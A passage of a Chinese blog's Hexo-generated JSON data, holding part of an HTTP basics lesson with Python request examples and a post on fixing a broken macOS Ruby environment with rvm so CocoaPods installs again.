<code>index.html</code>).</td>\n</tr>\n<tr>\n<td><code>Query String</code></td>\n<td><code>?login=true</code></td>\n<td>The query string starts with a question mark (<code>?</code>), and consists of a parameter (e.g. <code>login</code>) and a value (e.g. <code>true</code>). Multiple parameters can be separated by an ampersand (<code>&amp;</code>).</td>\n</tr>\n<tr>\n<td><code>Fragments</code></td>\n<td><code>#status</code></td>\n<td>Fragments are processed by the browsers on the client-side to locate sections within the primary resource (e.g. a header or section on the page).</td>\n</tr>\n</tbody></table>\n<p>并非所有组件都需要用来访问资源。其中最主要的强制性字段是方案（scheme）和主机（host），没有这两个字段，请求将没有资源可供请求。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>HyperText Transfer Protocol (HTTP) 是一种用于在Web上传输数据的协议。它是Web应用程序通信的基础，支持客户端与服务器之间的数据传输。在本课中，您将学习HTTP协议的基本概念和实现，以及如何使用Python库发出HTTP请求并分析响应。</p>\n<p>以下是一些课程中的关键概念和代码示例，以帮助您更好地理解HTTP协议和Python库的使用：</p>\n<h3 id=\"HTTP协议的主要特点：\"><a href=\"#HTTP协议的主要特点：\" class=\"headerlink\" title=\"HTTP协议的主要特点：\"></a>HTTP协议的主要特点：</h3><ul>\n<li>基于请求&#x2F;响应模型。</li>\n<li>使用URI来指定资源。</li>\n<li>使用方法（例如GET，POST，PUT等）来定义操作类型。</li>\n<li>使用状态码来表示响应状态。</li>\n<li>可以使用标头来传输元数据。</li>\n</ul>\n<h3 id=\"Python库的使用：\"><a href=\"#Python库的使用：\" class=\"headerlink\" title=\"Python库的使用：\"></a>Python库的使用：</h3><p>Python中有几个库可以用来发出HTTP请求并处理响应。以下是其中两个库的代码示例：</p>\n<h4 id=\"1-使用Requests库发出HTTP请求：\"><a href=\"#1-使用Requests库发出HTTP请求：\" class=\"headerlink\" title=\"1. 使用Requests库发出HTTP请求：\"></a>1. 使用Requests库发出HTTP请求：</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.get(<span class=\"string\">&#x27;https://www.example.com&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(response.status_code)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(response.content)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-使用urllib库发出HTTP请求：\"><a href=\"#2-使用urllib库发出HTTP请求：\" class=\"headerlink\" title=\"2. 使用urllib库发出HTTP请求：\"></a>2. 使用urllib库发出HTTP请求：</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> urllib.request</span><br><span class=\"line\"></span><br><span class=\"line\">response = urllib.request.urlopen(<span class=\"string\">&#x27;https://www.example.com&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(response.status)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(response.read())</span><br></pre></td></tr></table></figure>\n\n<p>在Python中，您可以使用requests或urllib库发出HTTP请求，并使用响应对象的方法和属性来处理响应数据。</p>\n<h3 id=\"HTTP请求和响应的主要组成部分：\"><a href=\"#HTTP请求和响应的主要组成部分：\" class=\"headerlink\" title=\"HTTP请求和响应的主要组成部分：\"></a>HTTP请求和响应的主要组成部分：</h3><ul>\n<li>请求：请求行，请求头，消息体。</li>\n<li>响应：状态行，响应头，消息体。</li>\n</ul>\n<p><img src=\"https://p.ipic.vip/ds0c00.png\" alt=\"url_structure\"></p>\n<table>\n<thead>\n<tr>\n<th><strong>Component</strong></th>\n<th><strong>Example</strong></th>\n<th><strong>Description</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>Scheme</code></td>\n<td><code>http://</code> <code>https://</code></td>\n<td>This is used to identify the protocol being accessed by the client, and ends with a colon and a double slash (<code>://</code>)</td>\n</tr>\n<tr>\n<td><code>User Info</code></td>\n<td><code>admin:password@</code></td>\n<td>This is an optional component that contains the credentials (separated by a colon <code>:</code>) used to authenticate to the host, and is separated from the host with an at sign (<code>@</code>)</td>\n</tr>\n<tr>\n<td><code>Host</code></td>\n<td><code>inlanefreight.com</code></td>\n<td>The host signifies the resource location. This can be a hostname or an IP address</td>\n</tr>\n<tr>\n<td><code>Port</code></td>\n<td><code>:80</code></td>\n<td>The <code>Port</code> is separated from the <code>Host</code> by a colon (<code>:</code>). If no port is specified, <code>http</code> schemes default to port <code>80</code> and <code>https</code> default to port <code>443</code></td>\n</tr>\n<tr>\n<td><code>Path</code></td>\n<td><code>/dashboard.php</code></td>\n<td>This points to the resource being accessed, which can be a file or a folder. If there is no path specified, the server returns the default index (e.g. <code>index.html</code>).</td>\n</tr>\n<tr>\n<td><code>Query String</code></td>\n<td><code>?login=true</code></td>\n<td>The query string starts with a question mark (<code>?</code>), and consists of a parameter (e.g. <code>login</code>) and a value (e.g. <code>true</code>). Multiple parameters can be separated by an ampersand (<code>&amp;</code>).</td>\n</tr>\n<tr>\n<td><code>Fragments</code></td>\n<td><code>#status</code></td>\n<td>Fragments are processed by the browsers on the client-side to locate sections within the primary resource (e.g. a header or section on the page).</td>\n</tr>\n</tbody></table>\n<p>并非所有组件都需要用来访问资源。其中最主要的强制性字段是方案（scheme）和主机（host），没有这两个字段，请求将没有资源可供请求。</p>\n"},{"title":"关于Ruby环境问题导致CocoaPods异常","date":"2022-07-13T07:05:53.000Z","_content":"\n## 问题描述\n\n原因：brew导致mac下ruby环境错了，无法正常识别可用的版本。\n\n```shell\n$ pod install\n/Library/Ruby/Site/2.6.0/rubygems.rb:281:in `find_spec_for_exe': can't find gem cocoapods (>= 0.a) with executable pod (Gem::GemNotFoundException)\n\tfrom /Library/Ruby/Site/2.6.0/rubygems.rb:300:in `activate_bin_path'\n\tfrom /usr/local/bin/pod:23:in `<main>'\n```\n\n## 解决\n\n列出所有安装的`ruby`版本，运行结果可以看到有2个版本，我的目标是升级到`3.1.2`，当前为`2.3.1`, 因此先删除`2.3.8`版本的。\n\n```shell\n$ rvm list\n\n=* ruby-2.3.1 [ x86_64 ]\n   ruby-2.3.8 [ x86_64 ]\n\n# => - current\n# =* - current && default\n#  * - default\n```\n\n因为没有特别的需求，所以我将本地的2个`ruby`删了，准备重新安装最新版本的`ruby`，命令如下：\n\n```shell\n$ rvm remove ruby-2.3.8\n```\n\n安装`3.1.2`版本\n\n```shell\n$ rvm install 3.1.2\nSearching for binary rubies, this might take some time.\nNo binary rubies available for: osx/12.0/x86_64/ruby-3.1.2.\nContinuing with compilation. Please read 'rvm help mount' to get more information on binary rubies.\nChecking requirements for osx.\nCertificates bundle '/usr/local/etc/openssl@1.1/cert.pem' is already up to date.\nRequirements installation successful.\nInstalling Ruby from source to: /Users/xx/.rvm/rubies/ruby-3.1.2, this may take a while depending on your cpu(s)...\nruby-3.1.2 - #downloading ruby-3.1.2, this may take a while depending on your connection...\n** Resuming transfer from byte position 16965632\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 3503k  100 3503k    0     0  3608k      0 --:--:-- --:--:-- --:--:-- 3630k\nNo checksum for downloaded archive, recording checksum in user configuration.\nruby-3.1.2 - #extracting ruby-3.1.2 to /Users/xx/.rvm/src/ruby-3.1.2 - please wait\nruby-3.1.2 - #configuring - please wait\nruby-3.1.2 - #post-configuration - please wait\nruby-3.1.2 - #compiling - please wait\nruby-3.1.2 - #installing - please wait\nruby-3.1.2 - #making binaries executable - please wait\nInstalled rubygems 3.3.7 is newer than 3.0.9 provided with installed ruby, skipping installation, use --force to force installation.\nruby-3.1.2 - #gemset created /Users/xx/.rvm/gems/ruby-3.1.2@global\nruby-3.1.2 - #importing gemset /Users/xx/.rvm/gemsets/global.gems - please wait\nruby-3.1.2 - #generating global wrappers - please wait\nruby-3.1.2 - #gemset created /Users/xx/.rvm/gems/ruby-3.1.2\nruby-3.1.2 - #importing gemsetfile /Users/xx/.rvm/gemsets/default.gems evaluated to empty gem list\nruby-3.1.2 - #generating default wrappers - please wait\nruby-3.1.2 - #adjusting #shebangs for (gem irb erb ri rdoc testrb rake).\nInstall of ruby-3.1.2 - #complete\n```\n\n查看安装结果\n\n```shell\n$ rvm list                                                                                                      \n   ruby-2.3.1 [ x86_64 ]\n=* ruby-3.1.2 [ x86_64 ]\n\n# => - current\n# =* - current && default\n#  * - default\n```\n\n移除`2.3.1`\n\n```shell\n$ rvm remove ruby-2.3.1\n\nruby-2.3.1 - #removing rubies/ruby-2.3.1 - please wait\nruby-2.3.1 - #removing gems - please wait\nUsing /Users/xx/.rvm/gems/ruby-3.1.2\n```\n\n最终结果如下\n\n```shell\n$ rvm list\n\n=* ruby-3.1.2 [ x86_64 ]\n\n# => - current\n# =* - current && default\n#  * - default\n```\n\n## 重新安装CocoaPods\n\n重新安装\n\n```shell\n$ gem install cocoapods\n\n...\n\nDone installing documentation for nanaimo, colored2, claide, CFPropertyList, atomos, xcodeproj, ruby-macho, nap, molinillo, gh_inspector, fourflusher, escape, cocoapods-try, netrc, cocoapods-trunk, cocoapods-search, cocoapods-plugins, cocoapods-downloader, cocoapods-deintegrate, ffi, ethon, typhoeus, public_suffix, fuzzy_match, concurrent-ruby, httpclient, algoliasearch, addressable, zeitwerk, tzinfo, i18n, activesupport, cocoapods-core, cocoapods after 19 seconds\n34 gems installed\n```\n\n## 安装依赖\n\n修复了Ruby和CocoaPods，可以继续安装Xcode依赖的了。\n\n","source":"_posts/关于Ruby环境问题导致CocoaPods异常.md","raw":"---\ntitle: 关于Ruby环境问题导致CocoaPods异常\ndate: 2022-07-13 15:05:53\ntags:\n  - iOS\n  - CocoaPods\n---\n\n## 问题描述\n\n原因：brew导致mac下ruby环境错了，无法正常识别可用的版本。\n\n```shell\n$ pod install\n/Library/Ruby/Site/2.6.0/rubygems.rb:281:in `find_spec_for_exe': can't find gem cocoapods (>= 0.a) with executable pod (Gem::GemNotFoundException)\n\tfrom /Library/Ruby/Site/2.6.0/rubygems.rb:300:in `activate_bin_path'\n\tfrom /usr/local/bin/pod:23:in `<main>'\n```\n\n## 解决\n\n列出所有安装的`ruby`版本，运行结果可以看到有2个版本，我的目标是升级到`3.1.2`，当前为`2.3.1`, 因此先删除`2.3.8`版本的。\n\n```shell\n$ rvm list\n\n=* ruby-2.3.1 [ x86_64 ]\n   ruby-2.3.8 [ x86_64 ]\n\n# => - current\n# =* - current && default\n#  * - default\n```\n\n因为没有特别的需求，所以我将本地的2个`ruby`删了，准备重新安装最新版本的`ruby`，命令如下：\n\n```shell\n$ rvm remove ruby-2.3.8\n```\n\n安装`3.1.2`版本\n\n```shell\n$ rvm install 3.1.2\nSearching for binary rubies, this might take some time.\nNo binary rubies available for: osx/12.0/x86_64/ruby-3.1.2.\nContinuing with compilation. Please read 'rvm help mount' to get more information on binary rubies.\nChecking requirements for osx.\nCertificates bundle '/usr/local/etc/openssl@1.1/cert.pem' is already up to date.\nRequirements installation successful.\nInstalling Ruby from source to: /Users/xx/.rvm/rubies/ruby-3.1.2, this may take a while depending on your cpu(s)...\nruby-3.1.2 - #downloading ruby-3.1.2, this may take a while depending on your connection...\n** Resuming transfer from byte position 16965632\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 3503k  100 3503k    0     0  3608k      0 --:--:-- --:--:-- --:--:-- 3630k\nNo checksum for downloaded archive, recording checksum in user configuration.\nruby-3.1.2 - #extracting ruby-3.1.2 to /Users/xx/.rvm/src/ruby-3.1.2 - please wait\nruby-3.1.2 - #configuring - please wait\nruby-3.1.2 - #post-configuration - please wait\nruby-3.1.2 - #compiling - please wait\nruby-3.1.2 - #installing - please wait\nruby-3.1.2 - #making binaries executable - please wait\nInstalled rubygems 3.3.7 is newer than 3.0.9 provided with installed ruby, skipping installation, use --force to force installation.\nruby-3.1.2 - #gemset created /Users/xx/.rvm/gems/ruby-3.1.2@global\nruby-3.1.2 - #importing gemset /Users/xx/.rvm/gemsets/global.gems - please wait\nruby-3.1.2 - #generating global wrappers - please wait\nruby-3.1.2 - #gemset created /Users/xx/.rvm/gems/ruby-3.1.2\nruby-3.1.2 - #importing gemsetfile /Users/xx/.rvm/gemsets/default.gems evaluated to empty gem list\nruby-3.1.2 - #generating default wrappers - please wait\nruby-3.1.2 - #adjusting #shebangs for (gem irb erb ri rdoc testrb rake).\nInstall of ruby-3.1.2 - #complete\n```\n\n查看安装结果\n\n```shell\n$ rvm list                                                                                                      \n   ruby-2.3.1 [ x86_64 ]\n=* ruby-3.1.2 [ x86_64 ]\n\n# => - current\n# =* - current && default\n#  * - default\n```\n\n移除`2.3.1`\n\n```shell\n$ rvm remove ruby-2.3.1\n\nruby-2.3.1 - #removing rubies/ruby-2.3.1 - please wait\nruby-2.3.1 - #removing gems - please wait\nUsing /Users/xx/.rvm/gems/ruby-3.1.2\n```\n\n最终结果如下\n\n```shell\n$ rvm list\n\n=* ruby-3.1.2 [ x86_64 ]\n\n# => - current\n# =* - current && default\n#  * - default\n```\n\n## 重新安装CocoaPods\n\n重新安装\n\n```shell\n$ gem install cocoapods\n\n...\n\nDone installing documentation for nanaimo, colored2, claide, CFPropertyList, atomos, xcodeproj, ruby-macho, nap, molinillo, gh_inspector, fourflusher, escape, cocoapods-try, netrc, cocoapods-trunk, cocoapods-search, cocoapods-plugins, cocoapods-downloader, cocoapods-deintegrate, ffi, ethon, typhoeus, public_suffix, fuzzy_match, concurrent-ruby, httpclient, algoliasearch, addressable, zeitwerk, tzinfo, i18n, activesupport, cocoapods-core, cocoapods after 19 seconds\n34 gems installed\n```\n\n## 安装依赖\n\n修复了Ruby和CocoaPods，可以继续安装Xcode依赖的了。\n\n","slug":"关于Ruby环境问题导致CocoaPods异常","published":1,"updated":"2022-07-13T08:06:49.142Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clh5pn0bo00017ex23as25naf","content":"<h2 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h2><p>原因：brew导致mac下ruby环境错了，无法正常识别可用的版本。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">pod install</span></span><br><span class=\"line\">/Library/Ruby/Site/2.6.0/rubygems.rb:281:in `find_spec_for_exe&#x27;: can&#x27;t find gem cocoapods (&gt;= 0.a) with executable pod (Gem::GemNotFoundException)</span><br><span class=\"line\">\tfrom /Library/Ruby/Site/2.6.0/rubygems.rb:300:in `activate_bin_path&#x27;</span><br><span class=\"line\">\tfrom /usr/local/bin/pod:23:in `&lt;main&gt;&#x27;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h2><p>列出所有安装的<code>ruby</code>版本，运行结果可以看到有2个版本，我的目标是升级到<code>3.1.2</code>，当前为<code>2.3.1</code>, 因此先删除<code>2.3.8</code>版本的。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">rvm list</span></span><br><span class=\"line\"></span><br><span class=\"line\">=* ruby-2.3.1 [ x86_64 ]</span><br><span class=\"line\">   ruby-2.3.8 [ x86_64 ]</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">=&gt; - current</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">=* - current &amp;&amp; default</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"> * - default</span></span><br></pre></td></tr></table></figure>\n\n<p>因为没有特别的需求，所以我将本地的2个<code>ruby</code>删了，准备重新安装最新版本的<code>ruby</code>，命令如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">rvm remove ruby-2.3.8</span></span><br></pre></td></tr></table></figure>\n\n<p>安装<code>3.1.2</code>版本</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">rvm install 3.1.2</span></span><br><span class=\"line\">Searching for binary rubies, this might take some time.</span><br><span class=\"line\">No binary rubies available for: osx/12.0/x86_64/ruby-3.1.2.</span><br><span class=\"line\">Continuing with compilation. Please read &#x27;rvm help mount&#x27; to get more information on binary rubies.</span><br><span class=\"line\">Checking requirements for osx.</span><br><span class=\"line\">Certificates bundle &#x27;/usr/local/etc/openssl@1.1/cert.pem&#x27; is already up to date.</span><br><span class=\"line\">Requirements installation successful.</span><br><span class=\"line\">Installing Ruby from source to: /Users/xx/.rvm/rubies/ruby-3.1.2, this may take a while depending on your cpu(s)...</span><br><span class=\"line\">ruby-3.1.2 - #downloading ruby-3.1.2, this may take a while depending on your connection...</span><br><span class=\"line\">** Resuming transfer from byte position 16965632</span><br><span class=\"line\"><span class=\"meta prompt_\">  % </span><span class=\"language-bash\">Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class=\"line\">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class=\"line\">100 3503k  100 3503k    0     0  3608k      0 --:--:-- --:--:-- --:--:-- 3630k</span><br><span class=\"line\">No checksum for downloaded archive, recording checksum in user configuration.</span><br><span class=\"line\">ruby-3.1.2 - #extracting ruby-3.1.2 to /Users/xx/.rvm/src/ruby-3.1.2 - please wait</span><br><span class=\"line\">ruby-3.1.2 - #configuring - please wait</span><br><span class=\"line\">ruby-3.1.2 - #post-configuration - please wait</span><br><span class=\"line\">ruby-3.1.2 - #compiling - please wait</span><br><span class=\"line\">ruby-3.1.2 - #installing - please wait</span><br><span class=\"line\">ruby-3.1.2 - #making binaries executable - please wait</span><br><span class=\"line\">Installed rubygems 3.3.7 is newer than 3.0.9 provided with installed ruby, skipping installation, use --force to force installation.</span><br><span class=\"line\">ruby-3.1.2 - #gemset created /Users/xx/.rvm/gems/ruby-3.1.2@global</span><br><span class=\"line\">ruby-3.1.2 - #importing gemset /Users/xx/.rvm/gemsets/global.gems - please wait</span><br><span class=\"line\">ruby-3.1.2 - #generating global wrappers - please wait</span><br><span class=\"line\">ruby-3.1.2 - #gemset created /Users/xx/.rvm/gems/ruby-3.1.2</span><br><span class=\"line\">ruby-3.1.2 - #importing gemsetfile /Users/xx/.rvm/gemsets/default.gems evaluated to empty gem list</span><br><span class=\"line\">ruby-3.1.2 - #generating default wrappers - please wait</span><br><span class=\"line\">ruby-3.1.2 - #adjusting #shebangs for (gem irb erb ri rdoc testrb rake).</span><br><span class=\"line\">Install of ruby-3.1.2 - #complete</span><br></pre></td></tr></table></figure>\n\n<p>查看安装结果</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">rvm list</span>                                                                                                      </span><br><span class=\"line\">   ruby-2.3.1 [ x86_64 ]</span><br><span class=\"line\">=* ruby-3.1.2 [ x86_64 ]</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">=&gt; - current</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">=* - current &amp;&amp; default</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"> * - default</span></span><br></pre></td></tr></table></figure>\n\n<p>移除<code>2.3.1</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">rvm remove ruby-2.3.1</span></span><br><span class=\"line\"></span><br><span class=\"line\">ruby-2.3.1 - #removing rubies/ruby-2.3.1 - please wait</span><br><span class=\"line\">ruby-2.3.1 - #removing gems - please wait</span><br><span class=\"line\">Using /Users/xx/.rvm/gems/ruby-3.1.2</span><br></pre></td></tr></table></figure>\n\n<p>最终结果如下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">rvm list</span></span><br><span class=\"line\"></span><br><span class=\"line\">=* ruby-3.1.2 [ x86_64 ]</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">=&gt; - current</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">=* - current &amp;&amp; default</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"> * - default</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"重新安装CocoaPods\"><a href=\"#重新安装CocoaPods\" class=\"headerlink\" title=\"重新安装CocoaPods\"></a>重新安装CocoaPods</h2><p>重新安装</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">gem install cocoapods</span></span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">Done installing documentation for nanaimo, colored2, claide, CFPropertyList, atomos, xcodeproj, ruby-macho, nap, molinillo, gh_inspector, fourflusher, escape, cocoapods-try, netrc, cocoapods-trunk, cocoapods-search, cocoapods-plugins, cocoapods-downloader, cocoapods-deintegrate, ffi, ethon, typhoeus, public_suffix, fuzzy_match, concurrent-ruby, httpclient, algoliasearch, addressable, zeitwerk, tzinfo, i18n, activesupport, cocoapods-core, cocoapods after 19 seconds</span><br><span class=\"line\">34 gems installed</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"安装依赖\"><a href=\"#安装依赖\" class=\"headerlink\" title=\"安装依赖\"></a>安装依赖</h2><p>修复了Ruby和CocoaPods，可以继续安装Xcode依赖的了。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h2><p>原因：brew导致mac下ruby环境错了，无法正常识别可用的版本。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">pod install</span></span><br><span class=\"line\">/Library/Ruby/Site/2.6.0/rubygems.rb:281:in `find_spec_for_exe&#x27;: can&#x27;t find gem cocoapods (&gt;= 0.a) with executable pod (Gem::GemNotFoundException)</span><br><span class=\"line\">\tfrom /Library/Ruby/Site/2.6.0/rubygems.rb:300:in `activate_bin_path&#x27;</span><br><span class=\"line\">\tfrom /usr/local/bin/pod:23:in `&lt;main&gt;&#x27;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h2><p>列出所有安装的<code>ruby</code>版本，运行结果可以看到有2个版本，我的目标是升级到<code>3.1.2</code>，当前为<code>2.3.1</code>, 因此先删除<code>2.3.8</code>版本的。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">rvm list</span></span><br><span class=\"line\"></span><br><span class=\"line\">=* ruby-2.3.1 [ x86_64 ]</span><br><span class=\"line\">   ruby-2.3.8 [ x86_64 ]</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">=&gt; - current</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">=* - current &amp;&amp; default</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"> * - default</span></span><br></pre></td></tr></table></figure>\n\n<p>因为没有特别的需求，所以我将本地的2个<code>ruby</code>删了，准备重新安装最新版本的<code>ruby</code>，命令如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">rvm remove ruby-2.3.8</span></span><br></pre></td></tr></table></figure>\n\n<p>安装<code>3.1.2</code>版本</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">rvm install 3.1.2</span></span><br><span class=\"line\">Searching for binary rubies, this might take some time.</span><br><span class=\"line\">No binary rubies available for: osx/12.0/x86_64/ruby-3.1.2.</span><br><span class=\"line\">Continuing with compilation. Please read &#x27;rvm help mount&#x27; to get more information on binary rubies.</span><br><span class=\"line\">Checking requirements for osx.</span><br><span class=\"line\">Certificates bundle &#x27;/usr/local/etc/openssl@1.1/cert.pem&#x27; is already up to date.</span><br><span class=\"line\">Requirements installation successful.</span><br><span class=\"line\">Installing Ruby from source to: /Users/xx/.rvm/rubies/ruby-3.1.2, this may take a while depending on your cpu(s)...</span><br><span class=\"line\">ruby-3.1.2 - #downloading ruby-3.1.2, this may take a while depending on your connection...</span><br><span class=\"line\">** Resuming transfer from byte position 16965632</span><br><span class=\"line\"><span class=\"meta prompt_\">  % </span><span class=\"language-bash\">Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class=\"line\">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class=\"line\">100 3503k  100 3503k    0     0  3608k      0 --:--:-- --:--:-- --:--:-- 3630k</span><br><span class=\"line\">No checksum for downloaded archive, recording checksum in user configuration.</span><br><span class=\"line\">ruby-3.1.2 - #extracting ruby-3.1.2 to /Users/xx/.rvm/src/ruby-3.1.2 - please wait</span><br><span class=\"line\">ruby-3.1.2 - #configuring - please wait</span><br><span class=\"line\">ruby-3.1.2 - #post-configuration - please wait</span><br><span class=\"line\">ruby-3.1.2 - #compiling - please wait</span><br><span class=\"line\">ruby-3.1.2 - #installing - please wait</span><br><span class=\"line\">ruby-3.1.2 - #making binaries executable - please 